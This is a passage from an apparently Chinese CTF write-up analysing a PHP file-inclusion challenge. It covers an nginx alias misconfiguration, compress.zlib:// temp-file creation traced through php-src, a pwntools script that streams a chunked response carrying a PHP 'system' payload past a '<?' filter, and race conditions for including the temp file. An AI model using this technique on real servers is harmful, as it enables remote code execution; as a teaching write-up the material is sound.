Error</h3><p>&#x5176;&#x4E2D;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#x7684;&#x914D;&#x7F6E;&#x9519;&#x8BEF;&#xFF1A;</p><p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location /.well-known {</span><br><span class="line">  autoindex on;</span><br><span class="line">  alias /var/www/html/well-known/;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F00;&#x542F;&#x4E86;&#x5217;&#x76EE;&#x5F55;&#x5E76;&#x4E14;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x904D;&#x5386;&#x5230;&#x4E0A;&#x5C42;&#x6587;&#x4EF6;&#x5939;&#x3002;</p><h3 id="Upload-Arbitrary-Data"><a href="#Upload-Arbitrary-Data" class="headerlink" title="Upload Arbitrary Data"></a>Upload Arbitrary Data</h3><p>&#x4E00;&#x5F00;&#x59CB;&#x6211;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x6CA1;&#x6709;<code>&lt;?</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x60F3;&#x5230;&#x7684;&#x662F;p&#x725B;&#x535A;&#x5BA2;&#x91CC;&#x9762;&#x6709;&#x5173;&#x6B7B;&#x4EA1; exit &#x7684;&#x5185;&#x5BB9;&#xFF0C;<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">&#x8C08;&#x4E00;&#x8C08;php://filter&#x7684;&#x5999;&#x7528;</a>&#xFF0C;&#x5948;&#x4F55;&#x539F;&#x6587;&#x7528;&#x7684;&#x662F;<code>file_put_content</code>&#xFF0C;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;<code>file_get_contents</code>&#xFF0C;&#x5E76;&#x4E14;&#x8FD9;&#x91CC;&#x7684;&#x5224;&#x65AD;&#x4E5F;&#x5728;&#x4F7F;&#x7528;&#x4E86;<code>file_get_contents</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;<code>&lt;?</code>&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;&#x5C31;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x4E86;&#x3002;</p><p>&#x800C;&#x4E14;&#x8FD9;&#x91CC;&#x6700;&#x5947;&#x602A;&#x7684;&#x5C31;&#x662F;&#x4E4B;&#x524D;&#x7528;&#x4E86;&#x4E00;&#x4E9B;&#x770B;&#x4F3C;&#x65E0;&#x5173;&#x7D27;&#x8981;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6BD4;&#x5982;&#x4F7F;&#x7528;&#x4E86;<code>putenv()</code>&#x51FD;&#x6570;&#x7B49;&#xFF0C;&#x7ED9;&#x4E86;&#x6211;&#x4EEC;&#x4E00;&#x4E2A; sandbox &#xFF0C;&#x7136;&#x800C;&#x6211;&#x4EEC;&#x4F3C;&#x4E4E;&#x65E0;&#x6CD5;&#x5229;&#x7528;&#x8868;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5565;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>balsn &#x961F;&#x4F0D;&#x5728;&#x516C;&#x5F00;&#x7684; wp &#x4E2D;&#x5199;&#x4E86;&#x6BD4;&#x8F83;&#x8BE6;&#x7EC6;&#x7684;&#x6E90;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x914D;&#x5408;&#x5176;&#x4E2D;&#x7684; wp &#x8FDB;&#x884C;&#x4E00;&#x4E0B;&#x7B80;&#x5355;&#x7684;&#x5206;&#x6790;&#x3002;</p><p>&#x9996;&#x5148;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x7ED3;&#x8BBA;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;<code>compress.zip://</code>&#x6D41;&#x8FDB;&#x884C;&#x4E0A;&#x4F20;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x770B;&#x76F8;&#x5173;&#x539F;&#x7406;&#x3002;</p><p>&#x5728; <a href="https://github.com/php/php-src" target="_blank" rel="noopener">php-src</a> &#x6E90;&#x4EE3;&#x7801;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x627E;&#x5230;&#x8BE5;&#x6D41;&#x7684;&#x76F8;&#x5173;&#x89E6;&#x53D1;&#x89E3;&#x6790;&#x51FD;&#x6570;<code>php_stream_gzopen</code></p><p>ext/zlib/zlib_fopen_wrapper.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">php_stream *<span class="hljs-title">php_stream_gzopen</span><span class="hljs-params">(php_stream_wrapper *wrapper, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">  zend_string **opened_path, php_stream_context *context STREAMS_DC)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;compress.zlib://&quot;</span>, path, <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">16</span>;</span><br><span class="line">true} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strncasecmp(<span class="hljs-string">&quot;zlib:&quot;</span>, path, <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {</span><br><span class="line">truetruepath += <span class="hljs-number">5</span>;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">trueinnerstream = php_stream_open_wrapper_ex(path, mode, STREAM_MUST_SEEK | options | STREAM_WILL_CAST, opened_path, context);</span><br><span class="line">true...</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6709;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;<code>STREAM_WILL_CAST</code>&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x8FD9;&#x4E2A;&#x6807;&#x5FD7;&#x4F4D;&#x7528;&#x6765;&#x5E72;&#x561B;&#xFF0C;&#x5728;<code>main/php_streams.h</code>&#x5B9A;&#x4E49;&#x4E86;&#x8BE5;&#x6807;&#x5FD7;&#x4F4D;:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* If you are going to end up casting the stream into a FILE* or</span></span><br><span class="line"><span class="hljs-comment"> * a socket, pass this flag and the streams/wrappers will not use</span></span><br><span class="line"><span class="hljs-comment"> * buffering mechanisms while reading the headers, so that HTTP</span></span><br><span class="line"><span class="hljs-comment"> * wrapped streams will work consistently.</span></span><br><span class="line"><span class="hljs-comment"> * If you omit this flag, streams will use buffering and should end</span></span><br><span class="line"><span class="hljs-comment"> * up working more optimally.</span></span><br><span class="line"><span class="hljs-comment"> * */</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STREAM_WILL_CAST                0x00000020</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x7528;&#x6765;&#x5C06; stream &#x8F6C;&#x6362;&#x6210; FILE* &#x7684;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x5C31;&#x4E0E;&#x6211;&#x4EEC;&#x521B;&#x5EFA;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x6709;&#x5173;&#x4E86;&#x3002;</p><p>&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_open_wrapper_ex</code>&#x51FD;&#x6570;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_open_wrapper_ex</code>&#x3002;</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI php_stream *_php_stream_open_wrapper_ex(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode, <span class="hljs-keyword">int</span> options,</span><br><span class="line">truetruezend_string **opened_path, php_stream_context *context STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">if</span> (stream != <span class="hljs-literal">NULL</span> &amp;&amp; (options &amp; STREAM_MUST_SEEK)) {</span><br><span class="line">truetruephp_stream *newstream;</span><br><span class="line"></span><br><span class="line">truetrue<span class="hljs-keyword">switch</span>(php_stream_make_seekable_rel(stream, &amp;newstream,</span><br><span class="line">truetruetruetruetrue(options &amp; STREAM_WILL_CAST)</span><br><span class="line">truetruetruetruetruetrue? PHP_STREAM_PREFER_STDIO : PHP_STREAM_NO_PREFERENCE))</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">true<span class="hljs-keyword">return</span> stream;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8BE5;&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E86;<code>php_stream_make_seekable_rel</code>&#xFF0C;&#x5E76;&#x5411;&#x5176;&#x4E2D;&#x4F20;&#x5165;&#x4E86;<code>STREAM_WILL_CAST</code>&#x53C2;&#x6570;&#xFF0C;&#x6211;&#x4EEC;&#x8DDF;&#x8FDB;<code>php_stream_make_seekable_rel</code>&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5728;<code>main/php_streams.h</code>&#x4E2D;&#x88AB; define &#x4E3A;<code>_php_stream_make_seekable</code>&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;</p><p>main/streams/cast.c</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* {{{ php_stream_make_seekable */</span></span><br><span class="line">PHPAPI <span class="hljs-keyword">int</span> _php_stream_make_seekable(php_stream *origstream, php_stream **newstream, <span class="hljs-keyword">int</span> flags STREAMS_DC)</span><br><span class="line">{</span><br><span class="line">true<span class="hljs-keyword">if</span> (newstream == <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_FAILED;</span><br><span class="line">true}</span><br><span class="line">true*newstream = <span class="hljs-literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (((flags &amp; PHP_STREAM_FORCE_CONVERSION) == <span class="hljs-number">0</span>) &amp;&amp; origstream-&gt;ops-&gt;<span class="hljs-built_in">seek</span> != <span class="hljs-literal">NULL</span>) {</span><br><span class="line">truetrue*newstream = origstream;</span><br><span class="line">truetrue<span class="hljs-keyword">return</span> PHP_STREAM_UNCHANGED;</span><br><span class="line">true}</span><br><span class="line"></span><br><span class="line">true<span class="hljs-comment">/* Use a tmpfile and copy the old streams contents into it */</span></span><br><span class="line"></span><br><span class="line">true<span class="hljs-keyword">if</span> (flags &amp; PHP_STREAM_PREFER_STDIO) {</span><br><span class="line">truetrue*newstream = php_stream_fopen_tmpfile();</span><br><span class="line">true} <span class="hljs-keyword">else</span> {</span><br><span class="line">truetrue*newstream = php_stream_temp_new();</span><br><span class="line">true}</span><br><span class="line">true<span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">/* }}} */</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x679C;<code>flags</code>&#x4E0E;<code>PHP_STREAM_PREFER_STDIO</code>&#x90FD;&#x88AB;&#x8BBE;&#x7F6E;&#x7684;&#x8BDD;&#xFF0C;&#x800C;<code>PHP_STREAM_PREFER_STDIO</code>&#x5728; main/php_streams.h &#x4E2D;&#x5DF2;&#x7ECF;&#x88AB; define</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PHP_STREAM_PREFER_STDIO1</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5173;&#x5FC3; flags &#x7684;&#x503C;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x786E;&#x5B9A; flags &#x7684;&#x503C;&#x975E;&#x96F6;&#x5373;&#x53EF;&#xFF0C;&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x8DDF;&#x8FDB;&#x6211;&#x4EEC;&#x6613;&#x77E5; flags &#x7684;&#x5728;&#x8FD9;&#x91CC;&#x975E;&#x96F6;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x8C03;&#x7528;&#x4E86;<code>php_stream_fopen_tmpfile</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E86;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x3002;</p><p>&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x9A8C;&#x8BC1;&#xFF0C;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x8DD1;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x7528; pwntools &#x8D77;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7528;&#x6765;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x5927;&#x6587;&#x4EF6;</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> re</span><br><span class="line"><span class="hljs-keyword">import</span> threading</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_chunk</span><span class="hljs-params">(l, data)</span>:</span></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;{}\r</span></span><br><span class="line"><span class="hljs-string">{}\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>.format(hex(len(data))[<span class="hljs-number">2</span>:], data))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):</span><br><span class="line">    l = listen(<span class="hljs-number">9999</span>)</span><br><span class="line">    l.wait_for_connection()</span><br><span class="line"></span><br><span class="line">    data1 = <span class="hljs-string">&apos;&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;X&apos;</span>)</span><br><span class="line">    data2 = <span class="hljs-string">&apos;&lt;?php system(&quot;/readflag&quot;); exit(); /*&apos;</span>.ljust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;b&apos;</span>)</span><br><span class="line">    data3 = <span class="hljs-string">&apos;c*/&apos;</span>.rjust(<span class="hljs-number">1024</span> * <span class="hljs-number">8</span>, <span class="hljs-string">&apos;c&apos;</span>)</span><br><span class="line"></span><br><span class="line">    l.recvuntil(<span class="hljs-string">&apos;\r\n\r\n&apos;</span>)</span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;HTTP/1.1 200 OK\r</span></span><br><span class="line"><span class="hljs-string">Content-Type: exploit/revxakep\r</span></span><br><span class="line"><span class="hljs-string">Connection: close\r</span></span><br><span class="line"><span class="hljs-string">Transfer-Encoding: chunked\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data1)</span><br><span class="line"></span><br><span class="line">    print(<span class="hljs-string">&apos;waiting...&apos;</span>)</span><br><span class="line">    print(<span class="hljs-string">&apos;sending php code...&apos;</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data2)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="hljs-number">3</span>)</span><br><span class="line"></span><br><span class="line">    send_chunk(l, data3)</span><br><span class="line"></span><br><span class="line">    l.send(<span class="hljs-string">&apos;&apos;&apos;0\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">\r</span></span><br><span class="line"><span class="hljs-string">&apos;&apos;&apos;</span>)</span><br><span class="line">    l.close()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x6837;&#x6211;&#x5728;&#x672C;&#x673A;&#x4E0A;&#x7528; fswatch &#x5F88;&#x660E;&#x663E;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5DF2;&#x7ECF;&#x751F;&#x6210;&#xFF0C;&#x5E76;&#x4E14;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53D1;&#x9001;&#x7684;&#x5185;&#x5BB9;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200107053126.png" alt></p><h3 id="Keep-Temp-File"><a href="#Keep-Temp-File" class="headerlink" title="Keep Temp File"></a>Keep Temp File</h3><p>&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x7EC8;&#x7A76;&#x8FD8;&#x662F;&#x4F1A;&#x88AB; php &#x5220;&#x9664;&#x6389;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x8981;&#x8FDB;&#x884C;&#x5305;&#x542B;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x65B9;&#x6CD5;&#x8BA9;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5C3D;&#x53EF;&#x80FD;&#x4E45;&#x7684;&#x7559;&#x5B58;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x8FD9;&#x6837;&#x6211;&#x4EEC;&#x624D;&#x6709;&#x673A;&#x4F1A;&#x53BB;&#x5305;&#x542B;&#x5B83;&#x3002;</p><p>&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x70B9;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x6211;&#x4EEC;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#x8BA9;&#x5B83;&#x505C;&#x7559;&#x6BD4;&#x8F83;&#x4E45;&#x7684;&#x65F6;&#x95F4;&#xFF1A;</p><ul><li>&#x4F7F;&#x7528;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#xFF0C;&#x8FD9;&#x6837;&#x5728;&#x4F20;&#x8F93;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x4F1A;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x8BA9;&#x6211;&#x4EEC;&#x5305;&#x542B;&#x5230;&#x6587;&#x4EF6;&#x4E86;&#x3002;</li><li>&#x4F7F;&#x7528; FTP &#x901F;&#x5EA6;&#x63A7;&#x5236;&#xFF0C;&#x5927;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x6839;&#x672C;&#x4E0A;&#x8FD8;&#x662F;&#x4F20;&#x8F93;&#x901F;&#x5EA6;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x9650;&#x5236;&#x4F20;&#x8F93;&#x901F;&#x7387;&#xFF0C;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>compress.zlib://ftp://</code>&#x5F62;&#x5F0F;&#xFF0C;&#x63A7;&#x5236; FTP &#x901F;&#x5EA6;&#x5373;&#x53EF;</li></ul><h3 id="Bypass-Waf"><a href="#Bypass-Waf" class="headerlink" title="Bypass Waf"></a>Bypass Waf</h3><p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x5C31;&#x8981;&#x770B;&#x5982;&#x4F55;&#x6765;&#x5BF9;&#x5173;&#x952E;&#x5730;&#x65B9;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x4E86;&#x3002;</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (stripos(file_get_contents($_POST[<span class="hljs-string">&apos;file&apos;</span>]), <span class="hljs-string">&apos;&lt;?&apos;</span>) === <span class="hljs-keyword">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">include_once</span>($_POST[<span class="hljs-string">&apos;file&apos;</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x5730;&#x65B9;&#x95EE;&#x4E86;&#x5F88;&#x591A;&#x5E08;&#x5085;&#xFF0C;&#x5305;&#x62EC;&#x4E00;&#x8840;&#x7684; TokyoWesterns &#x7684;&#x961F;&#x5458;&#x4EE5;&#x53CA;&#x53C2;&#x8003;&#x4E86;&#x4E3B;&#x8981;&#x7684;&#x516C;&#x5F00; WP&#xFF0C;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x5229;&#x7528;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x4E4B;&#x95F4;&#x6781;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p><p>&#x4EC0;&#x4E48;&#x610F;&#x601D;&#x5462;&#xFF1F;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;&#x6781;&#x5176;&#x7406;&#x60F3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x81EA;&#x5DF1;&#x7684;&#x670D;&#x52A1;&#x5148;&#x53D1;&#x9001;&#x4E00;&#x6BB5;&#x5783;&#x573E;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x901A;&#x8FC7;<code>stripos</code>&#x7684;&#x5224;&#x65AD;&#x5C31;&#x662F;&#x6CA1;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6587;&#x4EF6;&#x6570;&#x636E;&#xFF0C;&#x63A5;&#x7740;&#x6211;&#x4EEC;&#x5229;&#x7528; HTTP &#x957F;&#x94FE;&#x63A5;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x53EA;&#x8981;&#x8FD9;&#x4E2A;&#x94FE;&#x63A5;&#x4E0D;&#x65AD;&#x5F00;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x7B2C;&#x4E8C;&#x6BB5;&#x542B;&#x6709; PHP &#x4EE3;&#x7801;&#x7684;&#x6570;&#x636E;&#x4E86;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x80FD;&#x4F7F;<code>include_once</code>&#x5305;&#x542B;&#x6211;&#x4EEC;&#x7684;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><p>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x80FD;&#x7ED5;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;&#x65B9;&#x6CD5;&#x53EA;&#x80FD;&#x5229;&#x7528;&#x7ADE;&#x4E89;&#x7684;&#x5F62;&#x5F0F;&#x53BB;&#x5305;&#x542B;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ADE;&#x4E89;&#x7684;&#x70B9;&#x3002;</p><h3 id="Leak-Dir-path"><a href="#Leak-Dir-path" class="headerlink" title="Leak Dir path"></a>Leak Dir path</h3><p>&#x6700;&#x540E;&#xFF0C;&#x8981;&#x505A;&#x5230;&#x6587;&#x4EF6;&#x5305;&#x542B;&#xFF0C;&#x81EA;&#x7136;&#x5F97;&#x5148;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x800C;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x6BCF;&#x6B21;&#x90FD;&#x662F;&#x968F;&#x673A;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53C8;&#x4E0D;&#x5F97;&#x4E0D;&#x901A;&#x8FC7;&#x67D0;&#x4E9B;&#x65B9;&#x5F0F;&#x53BB;&#x83B7;&#x53D6;&#x8DEF;&#x5F84;&#x3002;</p><p>&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x770B;&#x5230;&#x9898;&#x76EE;&#x662F;&#x76F4;&#x63A5;&#x7ED9;&#x51FA;&#x4E86;&#x8DEF;&#x5F84;&#xFF0C;&#x4F46;&#x662F;&#x4E4D;&#x4E00;&#x770B;&#x4EE3;&#x7801;&#x6211;&#x4EEC;&#x8C8C;&#x4F3C;&#x53EA;&#x80FD;&#x7B49;&#x5230;&#x5168;&#x90E8;&#x51FD;&#x6570;&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#x624D;&#x80FD;&#x62FF;&#x5230;&#x8DEF;&#x5F84;&#xFF0C